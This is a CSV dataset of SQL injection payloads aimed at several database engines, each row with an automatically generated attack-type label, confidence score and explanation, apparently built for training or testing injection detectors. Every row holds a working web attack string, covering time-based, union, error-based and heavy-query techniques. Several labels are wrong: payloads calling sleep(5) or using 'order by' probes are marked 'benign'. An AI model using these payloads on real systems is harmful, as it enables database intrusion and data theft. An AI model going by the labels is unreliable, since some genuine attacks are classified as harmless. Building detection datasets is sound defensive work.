id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19967,"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt'",2
19968,"1"" ) as upjw where 3880 = 3880 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" ) as upjw where 3880 = 3880 and 5556 = ( select count ( * ) from all_users t1'",3
19969,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
19970,-6777%' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = ',boolean_blind,oracle,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=oracle.,3
19971,1' ) as uwmy where 6980 = 6980,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) as uwmy where 6980 = 6980',2
19972,"-4972' ) ) as kfzc where 8817 = 8817 union all select 8817,8817,8817,8817,8817,8817--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19973,"-2333' union all select 9714,9714,9714--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19974,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'ujcx' = 'ujcx",benign,mysql,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'ujcx' = 'uj'",2
19975,"1"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,a'",3
19976,"1"" ) ) ) union all select null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19977,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""onsd"" like ""onsd",error_based,mysql,0.9,Matched error_based (P4) via token(s) 'extractvalue' in payload; also saw heavy_query:'7+digit int' but error_based has lower priority (stronger signal). DB=mysql.,2
19978,"1 ) ) as rcon where 8190 = 8190 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1 ) ) as rcon where 8190 = 8190 or 5286 = ( select count ( * ) from all_users t1',3
19979,"-2864' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'vjbl' = 'vjbl",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
19980,"1%"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
19981,-7497' ) as kjzt where 3758 = 3758 or 4794 = 9499--,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 4794 = 9499' in payload. DB=generic.,3
19982,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'mzqi' = 'mzqi,time_blind,postgresql,0.9,Matched time_blind (P5) via token(s) 'pg_sleep' in payload. DB=postgresql.,2
19983,"-9247' ) ) ) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19984,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'eovg' like 'eovg",union_based,mysql,0.8,Matched union_based (P7) via token(s) 'union select' in payload. DB=mysql.,1
19985,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 7749 = 7749",heavy_query,sqlite,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=sqlite.,2
19986,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'nlky' like 'nlky",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
19987,"-9904"" ) ) union all select 9080,9080,9080,9080,9080--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19988,-4410 where 5749 = 5749 or 1317 = 9823--,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 1317 = 9823' in payload. DB=generic.,3
19989,"1 ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1 ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysu'",3
19990,"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",union_based,mysql,0.8,Matched union_based (P7) via token(s) 'union select' in payload. DB=mysql.,1
19991,"1' in boolean mode ) union all select null,null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19992,-9389' ) order by 1#,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-9389' ) order by 1#',3
19993,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'mmfq' = 'mmfq,boolean_blind,oracle,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=oracle.,3
19994,-2749' ) as fiho where 3531 = 3531 or 2777 = 1485#,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 2777 = 1485' in payload. DB=generic.,3
19995,"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""egxe"" = ""egxe",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
19996,-6453%' ) ) or ( 8459 = 8459 ) *4906 and ( ( '%' = ',benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-6453%' ) ) or ( 8459 = 8459 ) *4906 and ( ( '%' = '',2
19997,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""buzb"" = ""buzb",boolean_blind,oracle,0.8,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw error_based:'utl_inaddr.get_host_address' but boolean_blind has lower priority (stronger signal). DB=oracle.,1
19998,"1"" ) ) ) rlike ( select ( case when ( 7975 = 2446 ) then 1 else 0x28 end ) ) and ( ( ( ""qixm"" like ""qixm",boolean_blind,mysql,0.95,"Matched boolean_blind (P3) via token(s) 'rlike', 'case when' in payload. DB=mysql.",3
19999,-1300 ) as rrsm where 1086 = 1086 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,boolean_blind,oracle,0.8,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw error_based:'utl_inaddr.get_host_address' but boolean_blind has lower priority (stronger signal). DB=oracle.,1
20000,1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',boolean_blind,oracle,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select',3
20001,"1"" ) where 3390 = 3390",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1"" ) where 3390 = 3390'",2
20002,"1' ) as sjmt where 6541 = 6541 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"Matched heavy_query (P4) via token(s) 'generate_series', '7+digit int' in payload. DB=postgresql.",3
20003,"select sleep ( 5 ) and ( ( ( ""lczw"" = ""lczw",benign,mysql,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: 'select sleep ( 5 ) and ( ( ( ""lczw"" = ""lczw'",1
20004,1' in boolean mode ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) #,boolean_blind,oracle,0.8,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw error_based:'utl_inaddr.get_host_address' but boolean_blind has lower priority (stronger signal). DB=oracle.,1
20005,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) # ewsz,boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'rlike' in payload. DB=mysql.,3
20006,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'fbzo' like 'fbzo,boolean_blind,oracle,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw error_based:'xmltype' but boolean_blind has lower priority (stronger signal). DB=oracle.,2
20007,"1' ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20008,"-3270%' or elt ( 9404 = 3498,3498 ) and '%' = '",boolean_blind,mysql,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='-3270%' or elt ( 9404 = 3498,3498 ) and '%' = ''",2
20009,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""ygzq"" like ""ygzq",error_based,mysql,0.8,Matched error_based (P4) via token(s) 'updatexml' in payload. DB=mysql.,1
20010,"-6534%' ) ) or make_set ( 4107 = 9457,9457 ) and ( ( '%' = '",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-6534%' ) ) or make_set ( 4107 = 9457,9457 ) and ( ( '%' = ''",2
20011,"1 ) as qodq where 4945 = 4945 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1 ) as qodq where 4945 = 4945 or 9643 = ( select count ( * ) from domain.domains',3
20012,"1'|| ( select 'uyfo' where 1236 = 1236 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",boolean_blind,generic,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1'|| ( select 'uyfo' where 1236 = 1236 or 5286 = ( select count ( * ) from all_u',3
20013,"-2241 ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 6840 = 6840",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-2241 ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 6840 '",2
20014,"1 ) where 8302 = 8302 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
20015,1%' ) ) ),benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1%' ) ) )',3
20016,"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
20017,"-4586' ) as shdb where 6176 = 6176 union all select 6176,6176,6176,6176#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20018,1'+ ( select lqhd where 4251 = 4251 and ( 8754 = 5779 ) *5779 ) +',benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1'+ ( select lqhd where 4251 = 4251 and ( 8754 = 5779 ) *577',1
20019,-2717' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 8571 = 8571' in payload. DB=generic.,3
20020,"1 ) ) union all select null,null,null,null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20021,"1%"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""%"" = """,benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1%"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""%"" = '",2
20022,1%' ),benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1%' )',3
20023,"-5698' ) ) as egjr where 5586 = 5586 union all select 5586,5586,5586--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20024,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
20025,1'|| ( select 'sbip' from dual where 7302 = 7302 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) ||',boolean_blind,oracle,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1'|| ( select 'sbip' from dual where 7302 = 7302 and ( select * from ( select ( ',2
20026,1'|| ( select 'bwqc' from dual where 6897 = 6897 and sleep ( 5 ) #,benign,oracle,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1'|| ( select 'bwqc' from dual where 6897 = 6897 and sleep (',1
20027,1' ) ) as hzbj where 1725 = 1725 or sleep ( 5 ) #,benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) ) as hzbj where 1725 = 1725 or sleep ( 5 ) #',1
20028,"-2979' ) ) as klou where 7092 = 7092 union all select 7092,7092--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20029,"1' ) union all select null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20030,"1 ) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20031,"1' ) where 4297 = 4297 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) where 4297 = 4297 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$'",3
20032,"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""pnub"" = ""pnub",boolean_blind,mysql,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6'",2
20033,"iif ( 2084 = 5671,1,1/0 )",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: 'iif ( 2084 = 5671,1,1/0 )'",3
20034,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'raus' = 'raus",boolean_blind,db2,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systa'",3
20035,1' ) rlike sleep ( 5 ),boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'rlike' in payload. DB=mysql.,2
20036,"-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '%' = '",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '%' = ''",2
20037,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'pqxe' like 'pqxe",boolean_blind,mysql,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( sele'",2
20038,"-8812"" ) where 1646 = 1646 union all select 1646,1646,1646,1646,1646,1646--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20039,( select ( case when ( 6035 = 9882 ) then 6035 else 6035* ( select 6035 from mysql.db ) end ) ),boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
20040,waitfor delay '0:0:5' and ( 'eaxu' = 'eaxu,time_blind,mssql,0.9,Matched time_blind (P5) via token(s) 'waitfor delay' in payload. DB=mssql.,3
20041,"1%"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
20042,1' ) ),benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) )',3
20043,"1' and make_set ( 8403 = 8403,8899 ) and 'fttd' like 'fttd",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' and make_set ( 8403 = 8403,8899 ) and 'fttd' like 'fttd'",2
